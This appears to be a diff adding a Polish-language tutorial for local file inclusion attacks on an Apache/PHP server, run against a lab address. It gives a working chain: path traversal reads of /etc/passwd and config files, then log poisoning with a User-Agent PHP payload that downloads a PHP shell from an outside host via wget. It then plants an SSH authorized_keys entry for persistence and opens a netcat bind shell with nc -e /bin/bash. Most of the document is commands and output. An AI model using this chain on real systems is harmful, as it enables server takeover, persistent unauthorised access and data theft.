@@ -1,0 +1,164 @@
+1. sprawdzenie, czy Victim jest podatny na LFI:
+
+http://192.168.0.200/index.php?page=../../etc/passwd
+
+2. jeśli tak, upload ścieżki do shell'a: (poprzez User Agent Injection)
+
+$ wget --user-agent="<? system('wget -q http://bl4de.net16.net/hauru.txt -O /tmp/hauru.php'); ?>" http://192.168.0.200 -O /dev/null
+
+3. w tym wypadku kod odpowiada za zapisanie przykładowego PHP shell, w logach w związku z tym zostanie odnotowany wpis:
+
+[on Victim:]
+# cat /var/log/apache2/access.log | tail -1
+192.168.0.100 - - [24/Jan/2012:11:32:51 +0100] "GET / HTTP/1.1" 200 248 "-" "<? system('wget -q --no-check-certificate https://devilteam.pl/hauru.txt -O /tmp/hauru.php'); ?>"
+
+naturalnie zależnie od dystrybucji Linux lokalizacja logów różni się, 
+przykładowo Red Hat, CentOS oraz Fedora przechowują logi w /var/log/httpd/. 
+Powyższego logu nie da się załadować przy pomocy LFI:
+
+[on Victim:]
+[Tue Jan 24 11:34:04 2012] [error] [client 192.168.0.100] PHP Warning:  include(../../var/log/apache2/access.log): 
+failed to open stream: Permission denied in /var/www/index.php on line 1
+
+ponieważ logi są obsługiwane przez proces rodzica i z tego powodu Apache2 może zapisywać w logach, a procesy, które serwują stronę internetową nie mają do niego dostępu ze względu, że standardowe prawa do logów Apache2 to 
+# ls -la /var/log/apache2/
+razem 8
+drwxr-x--- 2 root adm  4096 01-24 11:24 .
+drwxr-xr-x 8 root root 4096 01-24 11:24 ..
+-rw-r----- 1 root adm     0 01-24 12:27 access.log
+-rw-r----- 1 root adm     0 01-24 12:27 error.log
+-rw-r--r-- 1 root root    0 01-24 11:24 other_vhosts_access.log
+
+przykładowe podatne logi można znaleźć poprzez m.in. komendę 
+
+# find /var/log -perm -o+r
+/var/log
+/var/log/lastlog
+/var/log/dpkg.log
+/var/log/fsck
+(...)
+
+4. przykładowy odczyt plików konfiguracyjnych:
+
+http://192.168.0.200/index.php?page=../../etc/apache2/apache2.conf
+http://192.168.0.200/index.php?page=../../etc/passwd
+
+Weźmy tutaj pod uwagę przypadek gdzie został dodany VirtualHost z własna obsługą logów zgodnie z dokumentacją:
+
+http://httpd.apache.org/docs/2.2/mod/mod_log_config.html#formats
+
+###
+Some commonly used log format strings are:
+Common Log Format (CLF)
+"%h %l %u %t \"%r\" %>s %b"
+Common Log Format with Virtual Host
+"%v %h %l %u %t \"%r\" %>s %b"
+NCSA extended/combined log format
+"%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-agent}i\""
+Referer log format
+"%{Referer}i -> %U"
+Agent (Browser) log format
+"%{User-agent}i"
+###
+
+oraz ustawiony został dostęp do logów dla użytkownika, który standardowo nie ma dostępu do logów 
+
+# cat example 
+<VirtualHost *:80>
+DocumentRoot /var/www/example
+ServerName www.example.com
+CustomLog /home/example/www/access.log "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-agent}i\""
+</VirtualHost>
+# mkdir /var/www/example
+# cp /var/www/index.php /var/www/example/
+# a2ensite example
+# mkdir -p /home/example/www/
+# /etc/init.d/apache2 reload
+
+no i tutaj niestety został popełniony duży błąd, nie zostały ustawione odpowiednie prawa (odczyt tylko dla użytkownika), 
+znając dystrybucję poprzez wywołanie chociażby /etc/issue.net osoba szukająca podatności uzyskuje informacje o lokalizacji plików, 
+przykładowo zajmujemy się tutaj domeną example.com, w Debianie prawie we wszystkich przypadkach lokalizacją 
+pliku konfiguracyjnego będzie którąś z poniższych 
+
+/etc/apache2/sites-available/default
+/etc/apache2/sites-available/default-ssl
+/etc/apache2/sites-available/example
+/etc/apache2/sites-available/example.com
+
+lub po prostu główny plik konfiguracyjny, dzięki temu można poznać lokalizację logów poprzez udane załadowanie pliku konfiguracyjnego, 
+następnie przykładowo odwołanie :
+
+$ wget --user-agent="<? system('uname -a'); ?>" http://www.example.com -O /dev/null
+
+i wywołanie logów poprzez LFI 
+
+192.168.0.100 - - [24/Jan/2012:16:42:01 +0100] "GET / HTTP/1.1" 200 - "-" "Linux debian 2.6.32-5-686 #1 SMP Wed Jan 11 12:29:30 UTC 2012 i686 GNU/Linux "
+
+
+5. Po udanym wykonaniu 2. ORAZ zapisu kodu wywołania powłoki do logów, wczytujemy je poprzez LFI (kod PHP zostanie wykonany,
+tworząc plik z shell'em hauru.php w katalogu /tmp) i wywołujemy zapisany w /tmp skrypt, który został zapisany w upranieniami serwera WWW:
+
+[on Victim:]
+-rw-r--r--  1 www-data www-data 100731 08-19 21:50 hauru.php
+
+ATAK:
+http://www.example.com/index.php?page=../../../tmp/hauru.php
+
+
+6. Zdalny dostęp przez SSH:
+
+Zostaje uzyskany dostęp do powłoki, w większości przypadków konfiguracji użytkownik z którego prawami działa demon www ma również prawa do katalogu,
+ w którym znajduje się witryna co jest bardzo zgubne ponieważ standardowo konfiguracja SSH pozwala na autoryzację za pośrednictwem kluczy. 
+Klucz publiczny pozwalający na zalogowanie odczytywany jest z $HOME/.ssh/authorized_keys, zgodnie z wpisem w /etc/passwd:
+
+www-data:x:33:33:www-data:/var/www:/bin/sh
+
+co za tym idzie w PHP shell wystarczy wywołać polecenie powłoki (dla hasła aaaaa):
+
+mkdir /var/www/.ssh;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6KPFjjER7uGU3rXj73BjnQrwGxc791IXIuuvhZThhr0SS4hwwWAROz8ciiuWeuag2EcgWJz7EDVJJAxDmICzQR7Q/7c1/6C+qWrYrsq5lwWVmgzu6h+F2vsRmtepSmy1WOqRGbTeIzZ3Fc4jkOQV2jPyKID3zdTL9i0CPcaog0SvttW58YbJx2UfHnWC0BY74zbI+D6znsUL4jVlHVBL9ztlcwt7aF2mAlSJWM9D0hGtSDES50lsE8yeFjkoUMFMJmVnpU6F2/Y92Cg4kjZ7e8ur4M2Hx9pTY46NzdcNvKi5A3bHD/QrXnVtIcH1zokfnp/A1worBGv/RNg9Hfgd1" > /var/www/.ssh/authorized_keys
+
+w związku z czym powstanie :
+
+# ls -la /var/www/.ssh
+razem 12
+drwxr-xr-x 2 www-data www-data 4096 01-24 17:16 .
+drwxr-xr-x 4 www-data www-data 4096 01-24 17:16 ..
+-rw-r--r-- 1 www-data www-data  389 01-24 17:16 authorized_keys
+a wtedy zostaje uzyskany dostęp do powłoki:
+
+
+####
+$ ssh www-data@192.168.0.200
+Linux debian 2.6.32-5-686 #1 SMP Wed Jan 11 12:29:30 UTC 2012 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+$ whoami
+www-data
+$ uname -a
+Linux debian 2.6.32-5-686 #1 SMP Wed Jan 11 12:29:30 UTC 2012 i686 GNU/Linux
+###
+
+
+7. Dostęp przez nc (netcat)
+
+w PHP shell po wydaniu komendy:
+
+nc -e '/bin/bash' -l -p 12345
+
+w systemie zacznie nasłuchiwać netcat :
+
+www-data  1307  0.6  0.0   1748   500 ?        S    19:13   0:00 sh -c nc -e '/bin/bash' -l -p 12345
+www-data  1308  0.3  0.0   1728   628 ?        S    19:13   0:00 nc -e /bin/bash -l -p 12345
+
+wtedy pozostaje tylko połączenie na dany port (wyższy od 1024, ponieważ poniżej tylko root ma prawa):
+
+$ nc 192.168.0.200 12345
+[192.168.1.3] 12345 (?) open
+whoami
+www-data
+
